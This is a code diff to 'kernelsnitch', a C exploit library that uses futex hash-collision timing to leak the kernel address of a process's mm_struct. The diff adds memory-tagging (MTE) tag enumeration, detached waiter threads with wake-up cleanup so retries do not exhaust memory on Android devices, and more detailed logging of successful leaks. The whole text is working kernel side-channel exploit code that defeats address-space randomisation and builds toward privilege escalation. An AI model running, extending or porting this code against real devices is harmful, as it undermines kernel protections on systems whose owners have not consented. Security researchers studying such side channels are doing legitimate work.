@@ -28,6 +28,30 @@
 #endif
 #define APPENDED_FUTEXES 4096
 #define MULITPLE 4
+#define KS_BUCKET_ID 128
+
+/* KASAN_HW_TAGS (MTE) puts a random tag in pointer bits 56-59; current->mm
+ * stored in the futex key is tagged, so the bruteforce must enumerate tags.
+ * Tag 0 is part of the enumeration, enabling this is a strict superset. */
+static int kernelsnitch_mte_auto(void)
+{
+    const char *env = getenv("KSNITCH_MTE");
+    if (env)
+        return atoi(env) > 0;
+    FILE *f = fopen("/proc/cpuinfo", "r");
+    if (!f)
+        return 0;
+    char line[1024];
+    int mte = 0;
+    while (fgets(line, sizeof(line), f)) {
+        if (strncmp(line, "Features", 8) == 0 && strstr(line, "mte")) {
+            mte = 1;
+            break;
+        }
+    }
+    fclose(f);
+    return mte;
+}
 #if defined(__INTEL) || defined(__AMD)
 #define IDENTITY_START 0xffff888000000000ULL
 #define IDENTITY_END   0xffffc88000000000ULL
@@ -135,13 +159,23 @@ static void *__do_increase(void *arg)
 static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
 {
     pthread_t tid;
+    size_t created = 0;
     for (size_t i = 0; i < amount; ++i) {
         struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
         inc_arg->id = id;
         inc_arg->ks = ks;
-        SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));
+        int ret = pthread_create(&tid, 0, __do_increase, (void *)inc_arg);
+        if (ret == 0) {
+            /* detach: bionic reaps the thread at exit; cleanup() wakes it */
+            pthread_detach(tid);
+            created++;
+        } else {
+            pr_warning("pthread_create %zu failed: %d (%s)\n", i, ret, strerror(ret));
+        }
     }
     WAIT();
+    if (created != amount)
+        pr_warning("waiters created=%zu/%zu for bucket id=%zu\n", created, amount, id);
 }
 
 /**
@@ -201,11 +235,13 @@ static void *__mm_leak(void *arg)
     struct range *range = &mm_leak_arg->range;
     if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
     size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
+    size_t scanned = 0;
     for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
         for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
             for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
+                scanned++;
 
                 size_t found_hash = 1;
                 if (!ks->mte_enabled) {
@@ -213,6 +249,7 @@ static void *__mm_leak(void *arg)
                     for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                         found_hash = (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
                     if (found_hash) {
+                        pr_success("ksnitch mm_struct hit=%016zx (no-tag mode)\n", mm_struct_candidate);
                         ks->mm_struct = mm_struct_candidate;
                         ks->found = 1;
                         break;
@@ -226,17 +263,18 @@ static void *__mm_leak(void *arg)
                         for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                             found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
                         if (found_hash) {
-                            if (ks->verbose)
-                                pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
+                            pr_success("ksnitch mm_struct hit=%016zx tag=%zx\n", __mm_struct_candidate, tag_candidate);
                             ks->mm_struct = __mm_struct_candidate;
                             ks->found = 1;
                             break;
                         }
                     }
-                } 
+                }
             }
         }
     }
+    pr_info("ksnitch scan thread %zd done scanned=%zu found=%zd range=[%016zx,%016zx)\n",
+            range->id, scanned, ks->found, range->start, range->end);
     free(mm_leak_arg);
     return 0;
 }
@@ -288,6 +326,11 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
         ks->mte_enabled ? "enabled" : "disabled");
     pin_to_core(0);
     futex_init();
+    pr_info("ksnitch setup: cpus=%zd threads=%zd collisions=%zd mm_sz=%zx slab_order=%zd slab_sz=%zx hashsize=%lu mte=%zd range=[%016zx,%016zx) per_thread=%zx\n",
+            ks->cpu_cnt, ks->thread_cnt, ks->collisions, ks->mm_struct_sz,
+            ks->mm_slab_order, (size_t)(KS_PAGE_SIZE << ks->mm_slab_order),
+            futex_hashsize, (size_t)ks->mte_enabled,
+            (size_t)IDENTITY_START, (size_t)IDENTITY_END, ks->identity_diff);
 
     ks->state = KERNELSNITCH_INIT;
     return ks;
@@ -299,7 +342,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
  */
 void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
 {
-    #define ID 128
+    #define ID KS_BUCKET_ID
 #ifndef KERNELSNITCH_THRESHOLD_MULT
 #define KERNELSNITCH_THRESHOLD_MULT 10
 #endif
@@ -334,10 +377,12 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         }
     }
     if (wanted == count) {
-        if (ks->verbose) pr_info("found %zd collisisons\n", count);
+        pr_success("ksnitch collisions ok=%zd/%zd approx_time=%zd threshold=%zd\n",
+                   count, wanted, approx_time, approx_time * KERNELSNITCH_THRESHOLD_MULT);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
     } else {
-        pr_warning("only found %zd collisions -> cannot continue\n", count);
+        pr_warning("ksnitch collisions only=%zd/%zd approx_time=%zd threshold=%zd -> cannot continue\n",
+                   count, wanted, approx_time, approx_time * KERNELSNITCH_THRESHOLD_MULT);
         ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
     }
 }
@@ -382,6 +427,16 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
 size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
 {
     ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
+    /* wake the piled-up waiters so the detached threads exit and their kernel
+     * stacks are released; without this every retry leaks APPENDED_FUTEXES
+     * threads and the device OOMs after a handful of rounds */
+    for (int round = 0; round < 2; ++round) {
+        long woken = __futex((unsigned int *)&ks->inc_futex[KS_BUCKET_ID],
+                             FUTEX_WAKE_PRIVATE, 0x7fffffff, NULL, NULL, 0);
+        if (woken <= 0)
+            break;
+        usleep(200000);
+    }
     munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
     ks->times = 0;
     munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
